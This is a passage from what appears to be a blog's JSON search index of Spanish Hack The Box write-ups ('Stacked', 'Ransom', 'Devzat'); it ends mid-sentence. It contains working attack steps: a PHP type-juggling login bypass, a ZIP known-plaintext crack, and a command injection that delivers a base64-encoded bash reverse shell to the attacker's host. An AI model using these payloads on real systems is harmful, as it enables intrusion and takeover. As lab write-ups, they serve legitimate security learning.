AAAAB3NzaC1yc2EAAAADAQABAAABgQDAh+6EhWWDF/im0ZA/M4jy+bzJWUOtZGrYbWUSKZsCXV2+7Fac0kE7wRW+zzIedFSVdC+xPO8MiIxaTblHlDodkP173F9Rmo/9hx7FLBM78SCwFcAJyqq1BAzcrOrGTE3kIwOx0Wv3xrRcLBWvCZnOo3UCwr8ynxmU5L05+0rGQVz4vZcGrT/4hbzgXCJBIW2ku0kRH04+t1zPikrLWDm25XR3UYQELGxsRJx+QJB526jRguCiqdlpz27S3LosJ+VxNamsoltl5EnHPtAZVsGHFTq0oVY3FXimnAU5NfrD2zp5ozbTlVFLvMO+55df4+7mJaeCD1jGE1gxklr5Dnpwr82Ef/+aiWMltAZC3XS6GwQqpNVqKeFdW6nY0mgggMYvu7zNIX55NTCb40G6PtRVLLpd5c9OBi9DpfGHBrV51aHleSbk/NM5kfP6urPfICVXSvgCGNcGKQeRheDBsiNMaeQ4zHfQscZtJL7sJtonT6gqU2JVKhUkM2bPuPBHNN0=  Finalmente, podemos acceder como root en la máquina mediante SSH:\n$ ssh -i id_rsa root@10.10.11.112 root@stacked:~# cat root.txt bd97095c84e01bc86ec04f08be824f38  ","image":"/images/HTB/Stacked/Stacked.png","permalink":"https://7rocky.github.io/htb/stacked/","section":"htb","summary":"Hack The Box. Linux. Máquina insana. Esta máquina contiene un entorno de LocalStack que es vulnerable a CSRF e inyección de comandos. Al descubrir una vulnerabilidad de XSS en un subdominio, podemos utilizar CSRF para explotar la vulnerabilidad de inyección de comandos y conseguir RCE en un contenedor. Después de escalar privilegios en el contenedor mediante el reinicio de un servicio e introduciendo un comando malicioso, podemos interactuar con Docker en la máquina anfitrión y crear un contenedor malicioso a partir de scratch que monta el sistema de archivos de la máquina en el contenedor para conseguir lectura y escritura arbitraria de archivos. Para comprometer esta máquina se necesitan técnicas de explotación web y conocimientos avanzados de Docker","time":14,"title":"Stacked"},{"contents":"  SO: Linux   Dificultad: Media   Dirección IP: 10.10.11.153   Fecha: 15 / 03 / 2022   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.153 -p 22,80 Nmap scan report for 10.10.11.153 Host is up (0.055s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA) | 256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA) |_ 256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) | http-title: Admin - HTML5 Admin Template |_Requested resource was http://10.10.11.153/login |_http-server-header: Apache/2.4.41 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 10.77 seconds  La máquina tiene abiertos los puertos 22 (SSH) y 80 (HTTP).\nEnumeración web Si vamos a http://10.10.11.153, se nos redirige a /login, que muestra un formulario de inicio de sesión:\nLa página web está construida con Laravel, que es un framework web de PHP. Nótese que existe una cookie llamada laravel_session:\n$ curl -I 10.10.11.153 HTTP/1.1 302 Found Date: Server: Apache/2.4.41 (Ubuntu) Cache-Control: no-cache, private Location: http://10.10.11.153/login Set-Cookie: XSRF-TOKEN=eyJpdiI6IjNLelg0R3cvaTAzRUJURkdjSkswNnc9PSIsInZhbHVlIjoiWGpqQ3oxME1CbXZ5dmFnOCt1SUtST3NMS1RTUUQxL0xZNncxYk9hbXBucHh3elV3OXBiN08wQkpteTV WRGR5SFBjNjBSN2pFODFHRDA1Rkt6ZE1NeklWcjJwZHJOTVFmNmFuTCtUTjBodnMrU29adWJZelFsd2VxVmJGRzdobFgiLCJtYWMiOiJhYWExNWI0MzRlNzk3MzRmYTE0YjdmMzQ5OGE4ZDI3ODFiODJlMWNlM TJmNTk0Y2JlOGM0ODk5NDczMjYxYTFjIiwidGFnIjoiIn0%3D Set-Cookie: laravel_session=eyJpdiI6InIwUm5hV3lrUS83cHAxMG5iMWxkREE9PSIsInZhbHVlIjoiQkVZR2pjd2FUc3Z6ZklETEU3dmpzRjI3N3EzTitMWnFXbXpYN3cwMnpGejBxeVRjVlJKMk9Udk VkcjIxTmVyNm9ZbFFKMitIbVB6Tm1WZW02WUVRNEVnbkU0VEU4ei8ySUdJQW5OdVdlbFE2cnI3MStXcU9ySkExRDl1Z29waTMiLCJtYWMiOiJjOWMyOWJkOWJkYzVjMjM1Y2IyZDZlMDJiYTUyODVmNmE1ZjEy MTcyZjY4NjM5YmUxYzdhMTkzY2Y0ZjY1NmI0IiwidGFnIjoiIn0%3D Content-Type: text/html; charset=UTF-8  Podemos tratar de inyectar código SQL en el formulario, pero no parece vulnerable.\nExplotación de Type Juggling Como está gestionado con PHP, podemos tratar de exploitar una vulnerabilidad conocida como Type Juggling. Esta es una prueba de concepto:\n$ php -a Interactive shell php \u0026gt; if (\"asdf\" == true) { echo \"true\"; } true  La vulnerabilidad está en el uso de ==, que no verifica el tipo de variable, solo el valor. Una solución correcta sería esta, usando ===:\nphp \u0026gt; if (\"asdf\" === true) { echo \"true\"; } else { echo \"false\"; } false  Si la página web es vulnerable a Type Juggling, si introducimos un tipo booleano como contraseña, evitaremos la autenticación. Vamos a usar Burp Suite (Repeater):\nNo podemos poner simplemente password=true ya que el servidor lo interpretará como \u0026quot;true\u0026quot; (un string). Para añadir un valor booleano, podemos usar un documento JSON. Aunque la petición es GET, podemos añadir el parámetro en el cuerpo de la petición:\nComo se muestra, obtenemos \u0026ldquo;Login Successful\u0026rdquo;, por lo que nos hemos saltado la autenticación. Utilizando Burp Suite (Proxy), podemos interceptar la petición y modificarla antes de que vaya al servidor, de manera que la respuesta sea correcta.\nLuego, tenemos este portal:\nEn este punto, ya tenemos user.txt:\nAtaque de texto claro conocido a un archivo ZIP cifrado Existe también un archivo ZIP llamado uploaded-file-3422.zip y está protegido con contraseña:\n$ file uploaded-file-3422.zip uploaded-file-3422.zip: Zip archive data, at least v2.0 to extract, compression method=deflate  Podemos tratar de realizar un ataque de fuerza bruta con fcrackzip, pero la contraseña parece fuerte y no se encuentra en rockyou.txt.\nPodemos ver los archivos contenidos y el método de compresión:\n$ unzip -v uploaded-file-3422.zip Archive: uploaded-file-3422.zip Length Method Size Cmpr Date Time CRC-32 Name -------- ------ ------- ---- ---------- ----- -------- ---- 220 Defl:N 158 28% 2020-02-25 06:03 6ce3189b .bash_logout 3771 Defl:N 1740 54% 2020-02-25 06:03 ab254644 .bashrc 807 Defl:N 392 51% 2020-02-25 06:03 d1b22a87 .profile 0 Stored 0 0% 2021-07-02 13:58 00000000 .cache/ 0 Stored 0 0% 2021-07-02 13:58 00000000 .cache/motd.legal-displayed 0 Stored 0 0% 2021-07-02 13:58 00000000 .sudo_as_admin_successful 0 Stored 0 0% 2022-03-07 06:32 00000000 .ssh/ 2610 Defl:N 1978 24% 2022-03-07 06:32 38804579 .ssh/id_rsa 564 Defl:N 463 18% 2022-03-07 06:32 cb143c32 .ssh/authorized_keys 564 Defl:N 463 18% 2022-03-07 06:32 cb143c32 .ssh/id_rsa.pub 2009 Defl:N 569 72% 2022-03-07 06:32 396b04b4 .viminfo -------- ------- --- ------- 10545 5763 45% 11 files $ 7z -slt l uploaded-file-3422.zip | grep -A 14 .bash_logout Path = .bash_logout Folder = - Size = 220 Packed Size = 170 Modified = 2020-02-25 07:03:22 Created = Accessed = Attributes = _ -rw-r--r-- Encrypted = + Comment = CRC = 6CE3189B Method = ZipCrypto Deflate Host OS = Unix Version = 20 Volume Index = 0  Parece que es un directorio personal de algún usuario. Además, el métoro de compresión es ZipCrypto Deflate.\nDespués de leer How I Cracked CONTI Ransomware Group’s Leaked Source Code ZIP File, vemos que existe un ataque de texto claro conocido a archivos ZIP cifrados.\nEl archivo .bash_logout puede ser el que viene por defecto. Este es el .bash_logout que tengo en mi máquina (el que viene por defecto):\n$ cp ~/.bash_logout . $ cat .bash_logout # ~/.bash_logout: executed by bash(1) when login shell exits. # when leaving the console clear the screen to increase privacy if [ \"$SHLVL\" = 1 ]; then [ -x /usr/bin/clear_console ] \u0026\u0026 /usr/bin/clear_console -q fi  Podemos verificar que ambos archivos .bash_logout son iguales utilizando el algoritmo CRC32 (utilizado por los archivos ZIP para detectar errores):\n\u0026gt;\u0026gt;\u0026gt; import zlib \u0026gt;\u0026gt;\u0026gt; bash_logout = open('.bash_logout', 'rb').read() \u0026gt;\u0026gt;\u0026gt; hex(zlib.crc32(bash_logout)) '0x6ce3189b'  En los comandos unzip / 7z anteriores podemos ver el valor CRC32 de .bash_logout, y los dos coinciden, por lo que tenemos un texto claro conocido.\nAhora es el momento de usar bkcrack (ataque de texto claro conocido) para guardar los archivos de uploaded-file-3422.zip en unlocked.zip. Necesitamos proporcionar un archivo plain.zip que contenga nuestro .bash_logout:\n$ zip plain.zip .bash_logout adding: .bash_logout (deflated 28%) $ ./bkcrack -C uploaded-file-3422.zip -c .bash_logout -P plain.zip -p .bash_logout bkcrack 1.3.5 - 2022-03-28 [03:34:35] Z reduction using 150 bytes of known plaintext 100.0 % (150 / 150) [03:34:35] Attack on 57097 Z values at index 7 Keys: 7b549874 ebc25ec5 7e465e18 78.5 % (44845 / 57097) [03:38:54] Keys 7b549874 ebc25ec5 7e465e18 $ ./bkcrack -C uploaded-file-3422.zip -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip password bkcrack 1.3.5 - 2022-03-28 [03:42:33] Writing unlocked archive unlocked.zip with password \"password\" 100.0 % (9 / 9) Wrote unlocked archive.  En este punto, podemos extraer los archivos de unlocked.zip:\n$ unzip -P password unlocked.zip Archive: unlocked.zip inflating: .bash_logout inflating: .bashrc inflating: .profile creating: .cache/ extracting: .cache/motd.legal-displayed extracting: .sudo_as_admin_successful creating: .ssh/ inflating: .ssh/id_rsa inflating: .ssh/authorized_keys inflating: .ssh/id_rsa.pub inflating: .viminfo  Escalada de privilegios Ahora tenemos una clave privada de SSH. Podemos conectarnos como usuario htb (ya que es una máquina de UHC) sin usar contraseña:\n$ chmod 600 id_rsa $ ssh -i id_rsa htb@10.10.11.153 htb@ransom:~$ id uid=1000(htb) gid=1000(htb) groups=1000(htb),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)  Aunque pertenecemos al grupo lxd, vamos a escalar de la forma intencionada.\nVamos a buscar la aplicación de Laravel para ver cómo se gestiona la autenticación:\nhtb@ransom:~$ find / -name \\*laravel\\* 2\u0026gt;/dev/null /srv/prod/storage/logs/laravel.log /srv/prod/vendor/laravel /srv/prod/vendor/fruitcake/laravel-cors  Genial, parece que los archivos fuente de Laravel están en /srv/prod. Vamos a buscar por \u0026quot;password\u0026quot; de manera recursiva:\nhtb@ransom:~$ cd /srv/prod htb@ransom:/srv/prod$ grep -nri password . | grep -vE 'js|config|vendor|bootstrap' | grep php | grep password ./resources/views/auth/login.blade.php:15: password: $(\"#password\").val() ./resources/views/auth/login.blade.php:44: \u0026lt;p\u0026gt;Please enter the password provided to you in order to send files to the E Corp Engineers.\u0026lt;/p\u0026gt; ./resources/views/auth/login.blade.php:50: \u0026lt;input type=\"password\" name=\"password\" id=\"password\" class=\"form-control form-control-lg\" /\u0026gt; ./resources/lang/en/validation.php:35: 'current_password' =\u0026gt; 'The password is incorrect.', ./resources/lang/en/validation.php:103: 'password' =\u0026gt; 'The password is incorrect.', ./resources/lang/en/passwords.php:7: | Password Reset Language Lines ./resources/lang/en/passwords.php:11: | that are given by the password broker for a password update attempt ./resources/lang/en/passwords.php:12: | has failed, such as for an invalid token or invalid new password. ./resources/lang/en/passwords.php:16: 'reset' =\u0026gt; 'Your password has been reset!', ./resources/lang/en/passwords.php:17: 'sent' =\u0026gt; 'We have emailed your password reset link!', ./resources/lang/en/passwords.php:19: 'token' =\u0026gt; 'This password reset token is invalid.', ./resources/lang/en/auth.php:17: 'password' =\u0026gt; 'The provided password is incorrect.', ./storage/framework/views/716af88e12f9db05fa041bff2e06875d7f0b09db.php:13: password: $(\"#password\").val() ./storage/framework/views/716af88e12f9db05fa041bff2e06875d7f0b09db.php:42: \u0026lt;p\u0026gt;Please enter the password provided to you in order to send files to the E Corp Engineers.\u0026lt;/p\u0026gt; ./storage/framework/views/716af88e12f9db05fa041bff2e06875d7f0b09db.php:48: \u0026lt;input type=\"password\" name=\"password\" id=\"password\" class=\"form-control form-control-lg\" /\u0026gt; ./app/Exceptions/Handler.php:25: 'current_password', ./app/Exceptions/Handler.php:26: 'password', ./app/Exceptions/Handler.php:27: 'password_confirmation', ./app/Models/User.php:23: 'password', ./app/Models/User.php:32: 'password', ./app/Models/User.php:46: * Always encrypt the password when it is updated. ./app/Models/User.php:53: $this-\u0026gt;attributes['password'] = bcrypt($value); ./app/Http/Kernel.php:66: 'password.confirm' =\u0026gt; \\Illuminate\\Auth\\Middleware\\RequirePassword::class, ./app/Http/Middleware/TrimStrings.php:15: 'current_password', ./app/Http/Middleware/TrimStrings.php:16: 'password', ./app/Http/Middleware/TrimStrings.php:17: 'password_confirmation', ./app/Http/Controllers/AuthController.php:34: 'password' =\u0026gt; 'required', ./app/Http/Controllers/AuthController.php:37: if ($request-\u0026gt;get('password') == \"UHC-March-Global-PW!\") { ./database/migrations/2014_10_12_100000_create_password_resets_table.php:7:class CreatePasswordResetsTable extends Migration ./database/migrations/2014_10_12_100000_create_password_resets_table.php:16: Schema::create('password_resets', function (Blueprint $table) { ./database/migrations/2014_10_12_100000_create_password_resets_table.php:30: Schema::dropIfExists('password_resets'); ./database/migrations/2014_10_12_000000_create_users_table.php:21: $table-\u0026gt;string('password'); ./database/factories/UserFactory.php:21: 'password' =\u0026gt; '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi', // password  Vemos que en app/Http/Controllers/AuthController.php se mira si la contraseña es igual a UHC-March-Global-PW! (usando == porque es vulnerable a Type Juggling). Esta password está configurada para el usuario root:\nhtb@ransom:/srv/prod$ su root Password: root@ransom:/srv/prod# cat /root/root.txt a4d5e9000007b5eabfb8358b2dd9ac1a  ","image":"/images/HTB/Ransom/Ransom.png","permalink":"https://7rocky.github.io/htb/ransom/","section":"htb","summary":"Hack The Box. Linux. Máquina media. Esta máquinaa tiene una página web en Laravel con un formulario de inicio de sesión que es vulnerable a Type Juggling. Después, encontramos un archivo ZIP encriptado y podemos realizar un ataque de texto claro conocido para extraer los archivos. La contraseña esperada en el formuulario de inicio de sesión se reutiliza para el usuario root. Para comprometer esta máquina se necesitan conocimientos básicos de pentesting web en PHP y conocimientos sobre archivos ZIP","time":5,"title":"Ransom"},{"contents":"  SO: Linux   Dificultad: Media   Dirección IP: 10.10.11.118   Fecha: 16 / 10 / 2021   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.118 -p 22,80,8000 Nmap scan report for 10.10.11.118 Host is up (0.034s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA) |_ 256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519) 80/tcp open http Apache httpd 2.4.41 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: devzat - where the devs at 8000/tcp open ssh (protocol 2.0) | ssh-hostkey: |_ 3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA) | fingerprint-strings: | NULL: |_ SSH-2.0-Go Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 37.59 seconds  La máquina tiene abiertos los puertos 22 (SSH), 80 (HTTP) y 8000 (SSH).\nEnumeración Para empezar, podemos leer el contenido de la página web (entrando a la dirección IP directamente redirige a devzat.htb), que es la siguiente:\nHan desarrollado un chat sobre SSH. Para utilizarlo, es necesario poner el siguiente comando:\nExplorando el chat sobre SSH Después de probar el chat, descubrimos que existen comandos en el propio chat:\n$ ssh -l asdf devzat.htb -p 8000 Welcome to the chat. There are no more users devbot: asdf has joined the chat asdf: /help [SYSTEM] Welcome to Devzat! Devzat is chat over SSH: github.com/quackduck/devzat [SYSTEM] Because there's SSH apps on all platforms, even on mobile, you can join from anywhere. [SYSTEM] [SYSTEM] Interesting features: [SYSTEM] • Many, many commands. Run /commands. [SYSTEM] • Rooms! Run /room to see all rooms and use /room #foo to join a new room. [SYSTEM] • Markdown support! Tables, headers, italics and everything. Just use in place of newlines. [SYSTEM] • Code syntax highlighting. Use Markdown fences to send code. Run /example-code to see an example. [SYSTEM] • Direct messages! Send a quick DM using =user \u0026lt;msg\u0026gt; or stay in DMs by running /room @user. [SYSTEM] • Timezone support, use /tz Continent/City to set your timezone. [SYSTEM] • Built in Tic Tac Toe and Hangman! Run /tic or /hang \u0026lt;word\u0026gt; to start new games. [SYSTEM] • Emoji replacements! (like on Slack and Discord) [SYSTEM] [SYSTEM] For replacing newlines, I often use bulkseotools.com/add-remove-line-breaks.php. [SYSTEM] [SYSTEM] Made by Ishan Goel with feature ideas from friends. [SYSTEM] Thanks to Caleb Denio for lending his server! [SYSTEM] [SYSTEM] For a list of commands run [SYSTEM] ┃ /commands asdf: /commands [SYSTEM] Commands [SYSTEM] clear - Clears your terminal [SYSTEM] message - Sends a private message to someone [SYSTEM] users - Gets a list of the active users [SYSTEM] all - Gets a list of all users who has ever connected [SYSTEM] exit - Kicks you out of the chat incase your client was bugged [SYSTEM] bell - Toggles notifications when you get pinged [SYSTEM] room - Changes which room you are currently in [SYSTEM] id - Gets the hashed IP of the user [SYSTEM] commands - Get a list of commands [SYSTEM] nick - Change your display name [SYSTEM] color - Change your display name color [SYSTEM] timezone - Change how you view time [SYSTEM] emojis - Get a list of emojis you can use [SYSTEM] help - Get generic info about the server [SYSTEM] tictactoe - Play tictactoe [SYSTEM] hangman - Play hangman [SYSTEM] shrug - Drops a shrug emoji [SYSTEM] ascii-art - Bob ross with text [SYSTEM] example-code - Hello world!  Se está utilizando Markdown para dar formato a los mensajes. Como curiosidad, podemos recibir una conexión a nuestra máquina escribiendo la sintaxis para una imagen y apuntando a nuestro servidor:\n![](http://10.10.17.44)  $ nc -nlvp 80 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::80 Ncat: Listening on 0.0.0.0:80 Ncat: Connection from 10.10.11.118. Ncat: Connection from 10.10.11.118:52632. GET / HTTP/1.1 Host: 10.10.17.44 User-Agent: Go-http-client/1.1 Accept-Encoding: gzip  La única información que proporciona esta conexión es que el chat está desarrollado con Go.\nDespués de probar payloads de inyección de comandos y tratar de escapar del contexto de SSH, podemos asumir que el chat es seguro y que no hay ninguna vulnerabilidad clara.\nBuscando subdominios La página principal (devzat.htb) solamente contiene información sobre el chat de SSH. Teniendo en cuenta que el servidor Apache redirige a devzat.htb (como virtual host), entonces probablemente exista algún otro virtual host. Podemos buscar subdominios utilizando ffuf sobre la cabecera Host de las peticiones HTTP:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.11.118 -H 'Host: FUZZ.devzat.htb' -fc 302 pets [Status: 200, Size: 510, Words: 20, Lines: 21]  Y obtenemos que pets.devzat.htb es un subdominio válido:\nAquí se puede encontrar una lista de animales con su nombre, su especie y una descripción de la especie correspondiente. Existe una opción para añadir un nuevo animal usando el siguiente formulario:\nAcceso a la máquina La petición POST se realiza mediante JavaScript (Svelte) usando AJAX. Si inspeccionamos la petición con las herramientas de desarrollador del navegador, podemos construir una petición equivalente con curl:\n$ curl pets.devzat.htb/api/pet -d '{\"name\":\"asdf\",\"species\":\"cat\"}' Pet was added successfully  Abusando de una inyección de comandos Hasta aquí, ya no hay mucho más que hacer. Por tanto, podemos intentar a inyectar comandos en ambos campos (name y species), y finalmente vemos que el campo species es vulnerable:\n$ curl pets.devzat.htb/api/pet -d '{\"name\":\"asdf\",\"species\":\"`curl 10.10.17.44`\"}' Pet was added successfully  $ nc -nlvp 80 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::80 Ncat: Listening on 0.0.0.0:80 Ncat: Connection from 10.10.11.118. Ncat: Connection from 10.10.11.118:58916. GET / HTTP/1.1 Host: 10.10.17.44 User-Agent: curl/7.68.0 Accept: */*  Por tanto, podemos utilizar la inyección de comandos para obtener ejecución remota de comandos (RCE) y entrar a la máquina (utilizando nc):\n$ echo -n 'bash -i \u0026 /dev/tcp/10.10.17.44/4444 0\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx  $ curl pets.devzat.htb/api/pet -d '{\"name\":\"asdf\",\"species\":\"`echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash`\"}'  $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.118. Ncat: Connection from 10.10.11.118:53090. bash: cannot set terminal process group (931): Inappropriate ioctl for device bash: no job control in this shell patrick@devzat:~/pets$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null patrick@devzat:~/pets$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm patrick@devzat:~/pets$ export TERM=xterm patrick@devzat:~/pets$ export SHELL=bash patrick@devzat:~/pets$ stty rows 50 columns 158  Enumeración del sistema Hemos conseguido entrar a la máquina como usuario patrick:\npatrick@devzat:~/pets$ ls /home catherine patrick  Existe otro usuario a nivel de sistema llamado catherine,\nPodemos listar los puertos abiertos utilizando netstat (mostrará también puertos internos que no son reportados por nmap):\npatrick@devzat:~/pets$ netstat -nat | grep LISTEN tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN tcp 0 0 127.0.0.1:8086 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN tcp 0 0 127.0.0.1:8443 0.0.0.0:* LISTEN tcp 0 0 127.0.0.1:5000 0.0.0.0:* LISTEN tcp6 0 0 :::80 :::* LISTEN tcp6 0 0 :::22 :::* LISTEN tcp6 0 0 :::8000 :::* LISTEN  Otra manera de enumerar puertos internos abiertos es leer del archivo /proc/net/tcp y traducir los puertos de hexadecimal a decimal utilizando un poco de shell scripting:\npatrick@devzat:~/pets$ for p in $(cat /proc/net/tcp | grep -v sl | awk '{print $2}' | awk -F : '{print $2}' | sort -u); do echo \"ibase=16; $p\" | bc; done 22 53 5000 8086 8443 42582 51994 55686  Tenemos que los puertos 8086 y 8443 están abiertos pero no expuestos, ya que nmap no los reportó como abiertos.\nEnumerando los procesos en ejecución, descubrimos que existe un contenedor de Docker que tiene el puerto 8086 abierto y contiene InfluxDB:\npatrick@devzat:~/pets$ ps -faux | grep root ... root 997 0.0 0.2 8880 4740 ? Ss 08:37 0:01 /usr/sbin/apache2 -k start root 1020 0.0 4.5 946772 91900 ? Ssl 08:37 0:04 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock root 1238 0.0 0.1 475324 3880 ? Sl 08:37 0:00 \\_ /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8086 -container-ip 172.17.0.2 -container-port 8086 root 1271 0.0 0.3 113372 7940 ? Sl 08:37 0:01 /usr/bin/containerd-shim-runc-v2 -namespace moby -id 0962e39dbfea62142f5f9e796a0fa5bd6df0c14a31f3786e03b720ea158cf462 -address /run/containerd/containerd.sock root 1296 0.1 2.8 554212 57816 ? Ssl 08:37 0:29 \\_ influxd root 9672 0.0 0.4 249544 9628 ? Ssl 09:14 0:00 /usr/lib/upower/upowerd  Por otro lado, podemos encontrar uns archivos ZIP pertenecientes al usuario catherine, y vemos que no tenemos permisos sobre esos archivos:\npatrick@devzat:~/pets$ find / -user catherine 2\u0026gt;/dev/null | grep -v home | xargs ls -l -rw------- 1 catherine catherine 28297 Jul 16 2021 /var/backups/devzat-dev.zip -rw------- 1 catherine catherine 27567 Jul 16 2021 /var/backups/devzat-main.zip  Movimiento lateral al usuario catherine Además, podemos buscar recursivamente por el texto catherine en los archivos de patrick, y obtenemos un código en Go interesante:\npatrick@devzat:~/pets$ cd patrick@devzat:~$ grep -nri catherine . Binary file ./devzat/devchat matches ./devzat/devchat.go:273: for possibleName == \"patrick\" || possibleName == \"admin\" || possibleName == \"catherine\" { ./devzat/devchat.go:302: } else if strings.ToLower(u.name) == \"catherine\" { ./devzat/devchat.go:303: u.writeln(\"patrick\", \"Hey Catherine, glad you came.\") ./devzat/devchat.go:304: u.writeln(\"catherine\", \"Hey bud, what are you up to?\") ./devzat/devchat.go:306: u.writeln(\"catherine\", \"Sure\") ./devzat/devchat.go:308: u.writeln(\"catherine\", \"Kinda busy right now :necktie:\") ./devzat/devchat.go:310: u.writeln(\"catherine\", \"k\") ./devzat/devchat.go:312: u.writeln(\"catherine\", \"Fine. As soon as the boss let me off the leash I will check it out.\") Binary file ./.cache/go-build/f1/f10fd574fd735d6eff3807c126e13ddbd8a5968e6c6c9f77c7f0026c370c81df-d matches Binary file ./.cache/go-build/70/70092305916ce0b492b14dafb1c95707ce96d17aaadf07c619cb526bf1b24b7f-d matches Binary file ./pets/petshop matches ./pets/go.mod:1:module git.devzat.htb/catherine/petshop  Este archivo devchat.go contiene mensajes antiguos (tal vez como recordatorio) de los usuarios admin, patrick y catherine (utilizando el chat sobre SSH):\n// ... if strings.ToLower(u.name) == \"patrick\" { u.writeln(\"admin\", \"Hey patrick, you there?\") u.writeln(\"patrick\", \"Sure, shoot boss!\") u.writeln(\"admin\", \"So I setup the influxdb for you as we discussed earlier in business meeting.\") u.writeln(\"patrick\", \"Cool :thumbs_up:\") u.writeln(\"admin\", \"Be sure to check it out and see if it works for you, will ya?\") u.writeln(\"patrick\", \"Yes, sure. Am on it!\") u.writeln(\"devbot\", \"admin has left the chat\") } else if strings.ToLower(u.name) == \"admin\" { u.writeln(\"admin\", \"Hey patrick, you there?\") u.writeln(\"patrick\", \"Sure, shoot boss!\") u.writeln(\"admin\", \"So I setup the influxdb for you as we discussed earlier in business meeting.\") u.writeln(\"patrick\", \"Cool :thumbs_up:\") u.writeln(\"admin\", \"Be sure to check it out and see if it works for you, will ya?\") u.writeln(\"patrick\", \"Yes, sure. Am on it!\") } else if strings.ToLower(u.name) == \"catherine\" { u.writeln(\"patrick\", \"Hey Catherine, glad you came.\") u.writeln(\"catherine\", \"Hey bud, what are you up to?\") u.writeln(\"patrick\", \"Remember the cool new feature we talked about the other day?\") u.writeln(\"catherine\", \"Sure\") u.writeln(\"patrick\", \"I implemented it. If you want to check it out you could connect to the local dev instance on port 8443.\") u.writeln(\"catherine\", \"Kinda busy right now :necktie:\") u.writeln(\"patrick\", \"That's perfectly fine :thumbs_up: You'll need a password I gave you last time.\") u.writeln(\"catherine\", \"Ok\") u.writeln(\"patrick\", \"I left the source for your review in backups.\") u.writeln(\"catherine\", \"Fine. As soon as the boss let me off the leash I will check it out.\") u.writeln(\"patrick\", \"Cool. I am very curious what you think of it. See ya!\") u.writeln(\"devbot\", \"patrick has left the chat\") } // ...  Según esto, podemos confirmar que los siguientes pasos serán: analizar el servicio de InfluxDB y encontrar algo que nos permita acceder a la máquina como catherine, y entonces descomprimir los archivos ZIP.\nCVE en InfluxDB InfluxDB es una base de datos escrita en Go que expone una API HTTP en el puerto 8086 (por defecto). Según la documentación oficial, podemos interactuar con InfluxDB mediante linea de comandos (influx) o con curl directamente.\nPodemos transferir el binario de influx para probar a conectarnos:\npatrick@devzat:~$ cd /tmp patrick@devzat:/tmp$ curl 10.10.17.44/influx -so influ patrick@devzat:/tmp$ chmod +x influx patrick@devzat:/tmp$ alias influx=/tmp/influx  Se utiliza un alias para poder utilizar influx como si fuera un comando a nivel de sistema. Sin embargo, influx no funciona. Parece que no está reconociendo la instancia de InfluxDB, o quizás hay algún problema con la autenticación:\npatrick@devzat:/tmp$ influx version Influx CLI 2.0.9 (git: d1233b7951) build_date: 2021-10-01T21:09:53Z patrick@devzat:/tmp$ influx ping Error: Got 404 from 'http://localhost:8086/health'. Error: 404 page not found. See 'influx ping -h' for help patrick@devzat:~$ influx query Error: Must specify org-id, or org name. Error: 404 page not found. See 'influx query -h' for help patrick@devzat:~$ influx setup -o asdf -t 1234 Error: failed to determine if instance has been configured: 404 page not found See 'influx setup -h' for help  Después de esto, podemos probar con curl, usando la dirección IP local o la dirección IP del contenedor de Docker, pero sigue sin funcionar:\npatrick@devzat:~$ curl http://localhost:8086 404 page not found patrick@devzat:~$ curl http://localhost:8086/ 404 page not found patrick@devzat:~$ curl http://localhost:8086/api/v2/setup 404 page not found patrick@devzat:~$ curl http://172.17.0.2:8086/api/v2/setup 404 page not found patrick@devzat:~$ curl http://172.17.0.2:8086/api/v1/setup 404 page not found patrick@devzat:~$ curl http://172.17.0.2:8086/api/v1 404 page not found patrick@devzat:~$ curl http://172.17.0.2:8086/api/v2 404 page not found patrick@devzat:~$ curl http://172.17.0.2:8086/api/v2/users 404 page not found patrick@devzat:~$ curl http://172.17.0.2:8086/api/v2/query Method Not Allowed patrick@devzat:~$ curl -XPOST http://172.17.0.2:8086/api/v2/query Flux query service disabled. Verify flux-enabled=true in the [http] section of the InfluxDB 